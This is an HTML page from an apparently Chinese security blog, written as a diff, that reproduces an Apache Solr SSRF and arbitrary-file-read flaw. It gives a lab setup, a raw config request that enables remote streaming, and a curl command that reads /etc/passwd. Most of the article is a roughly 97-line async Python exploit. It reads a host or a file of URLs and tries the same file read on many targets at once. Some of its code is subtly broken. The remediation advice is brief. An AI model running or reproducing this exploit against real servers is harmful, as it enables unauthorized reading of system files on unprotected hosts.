@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Apache-Solr 任意文件读取漏洞复现&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 漏洞描述Apache Solr是一个开源的搜索服务，使用Java语言开发。Apache Solr的某些功能存在过滤不严格，在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或文件读取漏洞。 漏洞评级Apache Solr stream.url SSR">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Apache%20Solr/Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Apache-Solr 任意文件读取漏洞复现&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 漏洞描述Apache Solr是一个开源的搜索服务，使用Java语言开发。Apache Solr的某些功能存在过滤不严格，在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或文件读取漏洞。 漏洞评级Apache Solr stream.url SSR">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:25:52.834Z">
+<meta property="article:modified_time" content="2022-07-08T09:06:16.939Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Apache Solr/Apache-Solr 任意文件读取漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Solr/Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.834Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache-Solr-任意文件读取漏洞复现"><a href="#Apache-Solr-任意文件读取漏洞复现" class="headerlink" title="Apache-Solr 任意文件读取漏洞复现"></a>Apache-Solr 任意文件读取漏洞复现</h1><p>===========================</p>
+<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Solr是一个开源的搜索服务，使用Java语言开发。Apache Solr的某些功能存在过滤不严格，在Apache Solr未开启认证的情况下，攻击者可直接构造特定请求开启特定配置，并最终造成SSRF或文件读取漏洞。</p>
+<h2 id="漏洞评级"><a href="#漏洞评级" class="headerlink" title="漏洞评级"></a>漏洞评级</h2><p>Apache Solr stream.url SSRF与任意文件读取漏洞 中危</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Solr 所有版本</p>
+<h2 id="安全版本"><a href="#安全版本" class="headerlink" title="安全版本"></a>安全版本</h2><p>官方不予修复，暂无安全版本。</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker search solr</span><br><span class="line">docker pull solr</span><br><span class="line">docker run -d -p 8983:8983 solr</span><br><span class="line">docker  <span class="built_in">exec</span>  -it  实例<span class="built_in">id</span>  /bin/bash</span><br><span class="line"><span class="built_in">cp</span> -r server/solr/configsets/_default/conf /var/solr/data/test1</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="http://www.bubuko.com/infodetail-3118740.html">http://www.bubuko.com/infodetail-3118740.html</a></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>首先获取core</p>
+<p>![](/resource/Apache-Solr任意文件读取漏洞复现/media/1.png)<br>core<br>以my_core测试为例，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /solr/my_core/config HTTP/1.1</span><br><span class="line">Host: x.x.x.x:8983</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 84</span><br><span class="line">&#123;<span class="string">&quot;set-property&quot;</span>:&#123;<span class="string">&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读取文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://ip:8983/solr/my_core/debug/dump?param=ContentStreams&quot;</span> -F <span class="string">&quot;stream.url=file:///etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>![](/resource/Apache-Solr任意文件读取漏洞复现/media/2.png)<br>读取结果</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>环境要求：python3.8+</p>
+<p>使用方法：python3 solr.py –help</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">URLAction</span>(argparse.Action):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, parser, namespace, values, option_string=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> urlparse(values):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Not a valid url!&quot;</span>)</span><br><span class="line">        <span class="built_in">setattr</span>(namespace, self.dest, values)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FILEAction</span>(argparse.Action):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__call__</span>(<span class="params">self, parser, namespace, values, option_string=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> pathlib.Path(values).exists():</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;File not exists!&quot;</span>)</span><br><span class="line">        <span class="built_in">setattr</span>(namespace, self.dest, values)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;Solr Poc&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--host&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, action=URLAction, <span class="built_in">help</span>=<span class="string">&quot;target host uri&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--file&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, action=FILEAction, <span class="built_in">help</span>=<span class="string">&quot;target host file&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;--conn&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">10</span>, <span class="built_in">help</span>=<span class="string">&quot;asyncio max connetions&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SEM = asyncio.Semaphore(args.conn)</span><br><span class="line">RESULT = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">host: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">str</span>, <span class="built_in">bool</span>]:</span><br><span class="line">    status = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> SEM:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> httpx.AsyncClient(base_url=host) <span class="keyword">as</span> client:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                core_data = (</span><br><span class="line">                    <span class="keyword">await</span> client.get(</span><br><span class="line">                        <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span>, timeout=<span class="number">3</span></span><br><span class="line">                    )</span><br><span class="line">                ).json()</span><br><span class="line">            <span class="keyword">except</span> httpx.ReadTimeout:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;host&#125;</span> TimeOut!&quot;</span>)</span><br><span class="line">                status = <span class="string">&quot;TimeOut&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> (status := core_data[<span class="string">&quot;status&quot;</span>]) :</span><br><span class="line">                    core = status.keys()[<span class="number">0</span>]</span><br><span class="line">                    <span class="keyword">await</span> client.post(</span><br><span class="line">                        <span class="string">f&quot;/solr/<span class="subst">&#123;core&#125;</span>/config&quot;</span>,</span><br><span class="line">                        json=&#123;</span><br><span class="line">                            <span class="string">&quot;set-property&quot;</span>: &#123;</span><br><span class="line">                                <span class="string">&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;</span>: <span class="string">&quot;true&quot;</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;,</span><br><span class="line">                    )</span><br><span class="line">                    result_data = (</span><br><span class="line">                        <span class="keyword">await</span> client.post(</span><br><span class="line">                            url=<span class="string">f&quot;/solr/<span class="subst">&#123;core&#125;</span>/debug/dump?param=ContentStreams&quot;</span>,</span><br><span class="line">                            data=&#123;<span class="string">&quot;stream.url&quot;</span>: <span class="string">&quot;file:///etc/passwd&quot;</span>&#125;,</span><br><span class="line">                        )</span><br><span class="line">                    ).json()</span><br><span class="line">                    <span class="keyword">if</span> (streams := result_data[<span class="string">&quot;streams&quot;</span>]) :</span><br><span class="line">                        <span class="built_in">print</span>(streams[<span class="number">0</span>][<span class="string">&quot;stream&quot;</span>])</span><br><span class="line">                        status = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                RESULT[host] = status</span><br><span class="line">                <span class="keyword">return</span> host, status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">loop</span>(<span class="params">urls</span>):</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(*<span class="built_in">list</span>(<span class="built_in">map</span>(check, urls)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    result_file = pathlib.Path(<span class="string">&quot;solr_main.json&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urls = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">if</span> args.host:</span><br><span class="line">            urls.add(args.host)</span><br><span class="line">        <span class="keyword">if</span> args.file:</span><br><span class="line">            <span class="keyword">with</span> pathlib.Path(args.file).<span class="built_in">open</span>(<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                urls = urls.union(</span><br><span class="line">                    &#123;url <span class="keyword">for</span> line <span class="keyword">in</span> file <span class="keyword">if</span> urlparse((url := line.strip()))&#125;</span><br><span class="line">                )</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;tasks: <span class="subst">&#123;<span class="built_in">len</span>(urls)&#125;</span>&quot;</span>)</span><br><span class="line">        asyncio.run(loop(urls))</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">with</span> result_file.<span class="built_in">open</span>(<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(json.dumps(RESULT, indent=<span class="number">4</span>, ensure_ascii=<span class="literal">True</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li><p>增加身份验证/授权，可参考官方文档：<a target="_blank" rel="noopener" href="https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plugins.html">https://lucene.apache.org/solr/guide/8_6/authentication-and-authorization-plugins.html</a></p>
+</li>
+<li><p>禁止Solr API 以及管理 UI 直接对公网开放。设置防火墙，以便只允许受信任的计算机和人员访问。</p>
+</li>
+</ul>
+<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://m.aliyun.com/doc/notice_list/9213612.html">https://m.aliyun.com/doc/notice_list/9213612.html</a><br><a target="_blank" rel="noopener" href="https://www.o2oxy.cn/3227.html">https://www.o2oxy.cn/3227.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Solr/Apache-Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="cl5c2qmfl001wy8v18t91gcfi" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2017-12629%EF%BC%89Apache%20Solr%20rce&xxe%20%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Apache%20Solr/Apache%20Solr%20Velocity%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
